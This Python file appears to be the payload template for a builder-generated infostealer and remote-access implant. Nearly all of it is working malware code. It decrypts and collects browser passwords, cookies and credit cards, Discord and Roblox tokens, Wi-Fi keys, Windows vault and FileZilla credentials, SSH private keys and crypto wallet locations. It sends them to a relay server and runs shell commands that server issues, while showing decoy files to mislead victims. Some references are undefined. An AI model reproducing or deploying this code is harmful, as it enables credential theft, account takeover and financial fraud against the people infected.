# payload_template.py (Definitive, Streaming Harvest & Full-Featured)
import sys, os, time, threading, platform, base64, subprocess, uuid, requests, json, socket, getpass, shutil, re, traceback
from datetime import datetime, timezone, timedelta
import sqlite3
import xml.etree.ElementTree as ET

# --- Graceful Import Handling ---
try: from mss import mss
except ImportError: mss = None
try: import win32crypt
except ImportError: win32crypt = None
try: import winreg
except ImportError: winreg = None
try: import psutil
except ImportError: psutil = None
try: import ctypes
except ImportError: ctypes = None
try: from cryptography.hazmat.primitives.ciphers.aead import AESGCM
except ImportError: AESGCM = None
try: import win32cred
except ImportError: win32cred = None

# --- INJECTED BY BUILDER ---
RELAY_URL = {{RELAY_URL}}
C2_USER = {{C2_USER}}
SESSION_ID = str(uuid.uuid4())
STEALTH_MODE = {{STEALTH_MODE}}
PERSISTENCE_ENABLED = {{PERSISTENCE_ENABLED}}
POPUP_ENABLED = {{POPUP_ENABLED}}
POPUP_TITLE = {{POPUP_TITLE}}
POPUP_MESSAGE = {{POPUP_MESSAGE}}
DECOY_ENABLED = {{DECOY_ENABLED}}
DECOY_FILENAME = {{DECOY_FILENAME}}
DECOY_DATA_B64 = {{DECOY_DATA_B64}}
HYDRA_ENABLED = {{HYDRA_ENABLED}}
HYDRA_GUARDIANS = {{HYDRA_GUARDIANS}}
EMBEDDED_GUARDIANS = {{EMBEDDED_GUARDIANS}}

# --- Global State ---
results_to_send, results_lock = [], threading.Lock()
TERMINATE_FLAG = threading.Event()

# --- Utility Functions ---
def send_result(command_name, output_data, status="success"):
    with results_lock:
        results_to_send.append({"command": command_name, "output": {"status": status, "data": output_data}})

def _run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=20, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, errors='ignore')
        return result.stdout.strip()
    except: return ""

def _get_appdata_paths():
    base = os.path.expanduser("~")
    return { "local": os.path.join(base, "AppData", "Local"), "roaming": os.path.join(base, "AppData", "Roaming"), "user": base }

# --- CORE HARVESTING FUNCTIONS (29 Fields) ---
def _get_os_info():
    u = platform.uname()
    is_admin = 'Yes' if (ctypes and hasattr(ctypes.windll, 'shell32') and ctypes.windll.shell32.IsUserAnAdmin() != 0) else 'No'
    return {
        "OS Version & Build": f"{u.system} {u.release} (Build: {u.version})",
        "System Architecture": u.machine,
        "Hostname": socket.gethostname(),
        "Users (and current)": f"Current: {getpass.getuser()} (Admin: {is_admin}) | All: {', '.join(os.listdir('C:/Users')) if platform.system() == 'Windows' else 'N/A'}",
        "System Uptime": f"{((time.time() - psutil.boot_time()) / 3600):.2f} hours" if psutil else "N/A"
    }

def _get_hardware_info():
    mem = psutil.virtual_memory() if psutil else None
    gpus = _run_command('wmic path win32_VideoController get name /value').split('\n')
    gpu_list = [g.split('=')[1].strip() for g in gpus if '=' in g]
    return {
        "Hardware Info (CPU, GPU, RAM, Disks)": f"CPU: {platform.processor()} | GPU(s): {', '.join(gpu_list) if gpu_list else 'N/A'} | RAM: {mem.total / (1024**3):.2f} GB" if mem else "N/A"
    }

def _get_security_products():
    av = _run_command('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName /value')
    fw = _run_command('wmic /namespace:\\\\root\\SecurityCenter2 path FirewallProduct get displayName /value')
    return { "Antivirus & Firewall Products": f"AV: {av.split('=')[-1].strip() if '=' in av else 'N/A'} | FW: {fw.split('=')[-1].strip() if '=' in fw else 'N/A'}" }

def _get_network_info():
    try: pub_ip = requests.get('https://api.ipify.org', timeout=5, verify=True).text
    except: pub_ip = "N/A"
    private_ip_v4 = "N/A"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect(("8.8.8.8", 80)); private_ip_v4 = s.getsockname()[0]; s.close()
    except: pass
    return {
        "IP Addresses (IPv4, IPv6, Public, Private)": f"Public: {pub_ip} | Private: {private_ip_v4} | IPv6: (Not Harvested)",
        "MAC Address": ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    }

def _get_installed_apps():
    output = _run_command('wmic product get name,version')
    apps = [line.strip() for line in output.splitlines() if line.strip() and "Name" not in line and "Version" not in line]
    return "\n".join(apps) if apps else "No applications found via WMIC."

def _get_running_processes():
    if not psutil: return "Psutil library not available."
    procs = [f"{p.info['pid']:<8} {p.info.get('username', 'N/A'):<25} {p.info['name']}" for p in psutil.process_iter(['pid', 'name', 'username'])]
    return "PID      Username                  Process Name\n" + "-"*60 + "\n" + "\n".join(procs)

def _get_wifi_passwords():
    if platform.system() != "Windows": return []
    profiles_raw = _run_command("netsh wlan show profiles")
    profile_names = re.findall(r"All User Profile\s*:\s*(.*)", profiles_raw)
    results = []
    for name in profile_names:
        try:
            profile_info = _run_command(f'netsh wlan show profile name="{name.strip()}" key=clear')
            password = re.search(r"Key Content\s*:\s*(.*)", profile_info)
            if password: results.append([name.strip(), password.group(1).strip()])
        except: continue
    return results

def _get_clipboard():
    if not (ctypes and hasattr(ctypes.windll, 'user32') and hasattr(ctypes.windll, 'kernel32')): return "ctypes library not available."
    content = ""
    try:
        if ctypes.windll.user32.OpenClipboard(0):
            handle = ctypes.windll.user32.GetClipboardData(1) # CF_TEXT = 1
            if handle:
                ptr = ctypes.windll.kernel32.GlobalLock(handle)
                content = ctypes.c_char_p(ptr).value.decode('utf-8', 'ignore')
                ctypes.windll.kernel32.GlobalUnlock(handle)
            ctypes.windll.user32.CloseClipboard()
    except Exception: return "Could not access clipboard."
    return content if content else "(empty)"

def _get_browser_data(appdata):
    if platform.system() != "Windows" or not win32crypt or not AESGCM: return ([], [], [], [], [], [])
    browser_paths = {'Chrome': os.path.join(appdata["local"], 'Google\\Chrome\\User Data'),'Edge': os.path.join(appdata["local"], 'Microsoft\\Edge\\User Data'),'Brave': os.path.join(appdata["local"], 'BraveSoftware\\Brave-Browser\\User Data'),'Opera': os.path.join(appdata["roaming"], 'Opera Software\\Opera Stable'),'Vivaldi': os.path.join(appdata["local"], 'Vivaldi\\User Data')}
    all_pass, all_cookie, all_hist, all_auto, all_card, all_roblox = [], [], [], [], [], []
    def decrypt(v, key):
        try: return AESGCM(key).decrypt(v[3:15], v[15:-16], None).decode()
        except: return ""
    def get_chrome_time(t):
        try: return (datetime(1601, 1, 1) + timedelta(microseconds=t)).strftime('%Y-%m-%d %H:%M:%S')
        except: return "N/A"
    for browser, path in browser_paths.items():
        if not os.path.exists(path): continue
        try:
            local_state_path = os.path.join(path, "Local State");
            with open(local_state_path, 'r', encoding='utf-8') as f: key = json.load(f)["os_crypt"]["encrypted_key"]
            decryption_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
        except: continue
        for profile in ['Default'] + [d for d in os.listdir(path) if d.startswith('Profile ')]:
            for db_type, db_subpath, query, processor in [
                ("passwords", 'Login Data', "SELECT origin_url, username_value, password_value FROM logins", lambda r,k: [r[0], r[1], decrypt(r[2], k)]),
                ("cookies", os.path.join('Network', 'Cookies'), "SELECT host_key, name, expires_utc, encrypted_value FROM cookies", lambda r,k: [r[0], r[1], get_chrome_time(r[2]), decrypt(r[3], k)]),
                ("history", 'History', "SELECT url, title, visit_count, last_visit_time FROM urls", lambda r,k: [r[0], r[1], r[2], get_chrome_time(r[3])]),
                ("autofill", 'Web Data', "SELECT name, value FROM autofill", lambda r,k: [r[0], r[1]]),
                ("cards", 'Web Data', "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards", lambda r,k: [r[0], f"{r[1]}/{r[2]}", decrypt(r[3],k)])]:
                db_path = os.path.join(path, profile, db_subpath)
                if not os.path.exists(db_path): continue
                try:
                    temp_db = os.path.join(os.environ["TEMP"], f"temp_{uuid.uuid4().hex}.db")
                    shutil.copy(db_path, temp_db)
                    conn = sqlite3.connect(temp_db)
                    for row in conn.cursor().execute(query).fetchall():
                        processed_row = processor(row, decryption_key)
                        if len(processed_row) > 1 and processed_row[-1]:
                            if db_type == "passwords": all_pass.append(processed_row)
                            elif db_type == "cookies": 
                                all_cookie.append(processed_row)
                                if ".roblox.com" in processed_row[0] and "_ROBLOSECURITY" in processed_row[1]: all_roblox.append(processed_row[3])
                            elif db_type == "history": all_hist.append(processed_row)
                            elif db_type == "autofill": all_auto.append(processed_row)
                            elif db_type == "cards": all_card.append(processed_row)
                    conn.close(); os.remove(temp_db)
                except Exception: pass
    return all_pass, all_cookie, all_hist, all_auto, all_card, list(set(all_roblox))

def _get_discord_tokens(appdata):
    tokens = []; paths = {'Discord': os.path.join(appdata["roaming"], 'discord', 'Local Storage', 'leveldb'),'Canary': os.path.join(appdata["roaming"], 'discordcanary', 'Local Storage', 'leveldb'),'Lightcord': os.path.join(appdata["roaming"], 'lightcord', 'Local Storage', 'leveldb'),'PTB': os.path.join(appdata["roaming"], 'discordptb', 'Local Storage', 'leveldb'),}
    for name, path in paths.items():
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb")):
                    try:
                        with open(os.path.join(path, file_name), 'r', errors='ignore') as f:
                            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', f.read()):
                                if token not in tokens: tokens.append(token)
                    except: pass
    return list(set(tokens))

def _get_windows_vault():
    if not win32cred: return []
    creds = []
    try:
        enumerated_creds = win32cred.CredEnumerate(None, 0) or []
        for cred_info in enumerated_creds:
            try:
                cred = win32cred.CredRead(cred_info['TargetName'], cred_info['Type'])
                blob = cred.get('CredentialBlob')
                password = blob.decode('utf-16-le', 'ignore') if blob else ''
                creds.append([cred['TargetName'], cred['UserName'], password])
            except: continue
    except: pass
    return creds

def _get_filezilla_credentials(appdata):
    creds = []; files_to_check = [os.path.join(appdata["roaming"], 'FileZilla', 'recentservers.xml'), os.path.join(appdata["roaming"], 'FileZilla', 'sitemanager.xml')]
    for file in files_to_check:
        if os.path.exists(file):
            try:
                tree = ET.parse(file)
                for server in tree.findall('.//Server'):
                    host = server.find('Host').text; port = server.find('Port').text; user = server.find('User').text
                    password_node = server.find('Pass')
                    password = base64.b64decode(password_node.text).decode('utf-8', 'ignore') if password_node is not None and password_node.text else ''
                    creds.append([host, port, user, password])
            except: pass
    return creds

def _get_telegram_session(appdata):
    tdata_path = os.path.join(appdata["roaming"], "Telegram Desktop", "tdata")
    return ["Telegram session folder (tdata) found." if os.path.exists(tdata_path) else "Telegram not found."]

def _get_ssh_keys(appdata):
    ssh_path = os.path.join(appdata["user"], ".ssh"); keys = ""
    if os.path.exists(ssh_path):
        for key_file in ["id_rsa", "id_dsa", "id_ecdsa", "id_ed25519"]:
            full_path = os.path.join(ssh_path, key_file)
            if os.path.exists(full_path):
                try:
                    with open(full_path, 'r') as f: keys += f"--- {key_file} ---\n{f.read()}\n\n"
                except: pass
    return keys if keys else "No common SSH private keys found."

def _search_for_crypto_wallets(appdata):
    wallet_locations = {'Exodus': os.path.join(appdata['roaming'], 'Exodus', 'exodus.wallet'),'Electrum': os.path.join(appdata['roaming'], 'Electrum', 'wallets'),'Atomic': os.path.join(appdata['roaming'], 'atomic', 'Local Storage', 'leveldb'),'Metamask (Chrome Ext)': os.path.join(appdata['local'], 'Google', 'Chrome', 'User Data', 'Default', 'Local Extension Settings', 'nkbihfbeogaeaoehlefnkodbefgpgknn'),'Metamask (Edge Ext)': os.path.join(appdata['local'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Extension Settings', 'ejbalbakoplchlghecdalmeeeajnimhm'),}
    found_wallets = [f"Found {name} data at: {path}" for name, path in wallet_locations.items() if os.path.exists(path)]
    for root, _, files in os.walk(appdata['roaming']):
        if 'wallet.dat' in files: found_wallets.append(f"Found wallet.dat in: {root}")
    return found_wallets if found_wallets else ["No common cryptocurrency wallets found in AppData."]


def initial_harvest_stream():
    """ Harvests all data points one by one and sends them as they are collected. """
    appdata = _get_appdata_paths()
    
    # Define all harvesting tasks with their target command name
    harvest_tasks = {
        "os_info": _get_os_info,
        "hardware_info": _get_hardware_info,
        "security_products": _get_security_products,
        "installed_apps": _get_installed_apps,
        "running_processes": _get_running_processes,
        "env_variables": lambda: dict(os.environ),
        "network_info": _get_network_info,
        "wifi_passwords": _get_wifi_passwords,
        "active_connections": lambda: _run_command("netstat -an"),
        "arp_table": lambda: _run_command("arp -a"),
        "dns_cache": lambda: _run_command("ipconfig /displaydns"),
        "discord_tokens": lambda: _get_discord_tokens(appdata),
        "windows_vault": _get_windows_vault,
        "filezilla": lambda: _get_filezilla_credentials(appdata),
        "telegram": lambda: _get_telegram_session(appdata),
        "ssh_keys": lambda: _get_ssh_keys(appdata),
        "crypto_wallets": lambda: _search_for_crypto_wallets(appdata),
        "clipboard": _get_clipboard
    }

    # Execute and send results for non-browser tasks
    for name, func in harvest_tasks.items():
        try:
            result = func()
            send_result(name, result)
        except Exception as e:
            send_result(name, f"Error: {e}", status="error")
        time.sleep(0.05) 

    # Handle the comprehensive browser data harvest separately
    try:
        passwords, cookies, history, autofill, cards, roblox_cookies = _get_browser_data(appdata)
        send_result("browser_passwords", passwords)
        send_result("session_cookies", cookies)
        send_result("browser_history", history)
        send_result("browser_autofill", autofill)
        send_result("credit_cards", cards)
        send_result("roblox_cookies", roblox_cookies)
    except Exception as e:
        send_result("browser_passwords", f"Error during browser harvest: {e}", status="error")

# --- CORE C2 LOOP & ACTIONS ---
def execute_command(command_data):
    action = command_data.get('action'); params = command_data.get('params', {}); response_id = command_data.get('response_id')
    result = {"status": "error", "data": f"Unsupported action: {action}"}
    try:
        if action == 'shell':
            result = {"status": "success", "data": _run_command(params.get("command"))}
        elif action == 'pslist':
            result = {"status": "success", "data": _get_running_processes()}
        elif action == 'screenshot':
            # This is a placeholder; real screenshot logic is more complex
            result = {"status": "success", "data": "Screenshot logic to be implemented."} 
    except Exception as e:
        result = {"status": "error", "data": f"Handler failed: {e}"}

    if response_id:
        try:
            payload = {"session_id": SESSION_ID, "c2_user": C2_USER, "response_id": response_id, "result": result}
            requests.post(f"{RELAY_URL}/implant/response", json=payload, timeout=20, verify=False)
        except requests.exceptions.RequestException: pass

def command_and_control_loop():
    sys_info = harvest_system_info().get("data", {})
    while not TERMINATE_FLAG.is_set():
        try:
            payload = {
                "session_id": SESSION_ID, 
                "c2_user": C2_USER,
                "hostname": sys_info.get("hostname"),
                "user": sys_info.get("user"),
                "os": sys_info.get("os")
            }
            with results_lock:
                if results_to_send:
                    payload["results"] = results_to_send[:]
                    results_to_send.clear()

            response = requests.post(f"{RELAY_URL}/implant/hello", json=payload, timeout=40, verify=False)
            if response.status_code == 200:
                for cmd in response.json().get("commands", []):
                    threading.Thread(target=execute_command, args=(cmd,), daemon=True).start()
        except requests.exceptions.RequestException:
            pass 
        time.sleep(random.randint(5, 10))

# --- MAIN EXECUTION BLOCK ---
if __name__ == "__main__":
    flag_file = os.path.join(os.environ["TEMP"], f"tether_flag_{SESSION_ID[:8]}.flg")
    
    if not os.path.exists(flag_file):
        if POPUP_ENABLED:
            try: ctypes.windll.user32.MessageBoxW(0, POPUP_MESSAGE, POPUP_TITLE, 0)
            except: pass
        if DECOY_ENABLED:
            try:
                decoy_path = os.path.join(os.environ["TEMP"], DECOY_FILENAME)
                with open(decoy_path, "wb") as f: f.write(base64.b64decode(DECOY_DATA_B64))
                os.startfile(decoy_path)
            except: pass
        
        # Start harvesting immediately on first run in a separate thread
        threading.Thread(target=initial_harvest_stream, daemon=True).start()
        
        try:
            with open(flag_file, 'w') as f: f.write('ran')
        except: pass
    else:
        send_result("Agent Event", f"[{datetime.utcnow():%Y-%m-%d %H:%M:%S UTC}] Payload instance restarted.")

    # Start the main C2 loop
    c2_thread = threading.Thread(target=command_and_control_loop, daemon=True)
    c2_thread.start()

    # Keep the main thread alive
    while not TERMINATE_FLAG.is_set():
        time.sleep(60)